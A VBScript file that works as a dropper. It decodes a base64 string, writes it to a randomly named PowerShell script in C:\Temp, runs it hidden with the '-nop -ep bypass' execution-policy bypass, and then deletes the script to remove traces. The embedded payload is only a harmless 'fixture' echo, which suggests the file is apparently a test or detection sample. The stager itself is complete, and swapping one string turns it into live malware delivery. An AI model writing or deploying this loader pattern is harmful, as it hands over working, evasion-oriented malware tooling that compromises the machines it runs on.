Option Explicit

' ===== SHARED MODULE-LEVEL STATE =====
Dim g_encodedPayload, g_tempScriptPath, g_launchCommand
Dim g_fso, g_wshShell, g_isSuccess

' ===== CONSTANTS =====
Const TEMP_DIR = "C:\Temp\"
Const SCRIPT_SUFFIX = ".ps1"
Const PS_LAUNCH_CMD = "powershell.exe -nop -ep bypass -file """

' ===== ENTRY POINT =====
g_encodedPayload = "V3JpdGUtT3V0cHV0ICJmaXh0dXJlIg=="
g_isSuccess = False

Set g_fso = CreateObject("Scripting.FileSystemObject")
Set g_wshShell = CreateObject("WScript.Shell")

g_isSuccess = StepPrepareDirectory()
If g_isSuccess Then g_isSuccess = StepDecodeAndWrite()
If g_isSuccess Then g_isSuccess = StepInvoke()

StepRemoveArtifacts
If g_isSuccess = False Then WScript.Quit 1

' ===== STEP 1: PREPARE DIRECTORY =====
Function StepPrepareDirectory()
    StepPrepareDirectory = False

    If Not g_fso.FolderExists(TEMP_DIR) Then
        On Error Resume Next
        g_fso.CreateFolder TEMP_DIR
        If Err.Number <> 0 Then
            Emit "FOLDER_ERR: " & Err.Description
            Exit Function
        End If
        On Error GoTo 0
    End If

    g_tempScriptPath = TEMP_DIR & MakeRandomTag() & SCRIPT_SUFFIX
    g_launchCommand = PS_LAUNCH_CMD & g_tempScriptPath & """"

    StepPrepareDirectory = True
End Function

' ===== STEP 2: DECODE AND WRITE SCRIPT =====
Function StepDecodeAndWrite()
    StepDecodeAndWrite = False

    On Error Resume Next

    Dim domDoc, domElement, binaryData, streamObj, targetFile, decodedString

    Set domDoc = CreateObject("MSXML2.DOMDocument")
    Set domElement = domDoc.createElement("b64")
    domElement.DataType = "bin.base64"
    domElement.text = g_encodedPayload
    binaryData = domElement.nodeTypedValue

    Set streamObj = CreateObject("ADODB.Stream")
    With streamObj
        .Type = 1
        .Open
        .Write binaryData
        .Position = 0
        .Type = 2
        .Charset = "utf-8"
        decodedString = .ReadText
        .Close
    End With

    Set targetFile = g_fso.CreateTextFile(g_tempScriptPath, True)
    targetFile.Write decodedString
    targetFile.Close

    If Err.Number = 0 Then
        StepDecodeAndWrite = True
    Else
        Emit "DECODE_ERR: " & Err.Description
    End If

    On Error GoTo 0
End Function

' ===== STEP 3: INVOKE =====
Function StepInvoke()
    StepInvoke = False
    On Error Resume Next
    g_wshShell.Run g_launchCommand, 0, True
    If Err.Number = 0 Then
        StepInvoke = True
    Else
        Emit "RUN_ERR: " & Err.Description
    End If
    On Error GoTo 0
End Function

' ===== CLEANUP =====
Sub StepRemoveArtifacts()
    On Error Resume Next
    If g_fso.FileExists(g_tempScriptPath) Then g_fso.DeleteFile g_tempScriptPath, True
    On Error GoTo 0
End Sub

' ===== UTILITY: GENERATE RANDOM TAG =====
Function MakeRandomTag()
    Const ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Dim result, counter, index
    result = ""
    Randomize
    For counter = 1 To 8
        index = Int(Rnd() * Len(ALPHABET)) + 1
        result = result & Mid(ALPHABET, index, 1)
    Next
    MakeRandomTag = result
End Function

' ===== UTILITY: EMIT MESSAGE =====
Sub Emit(message)
    WScript.Echo message
End Sub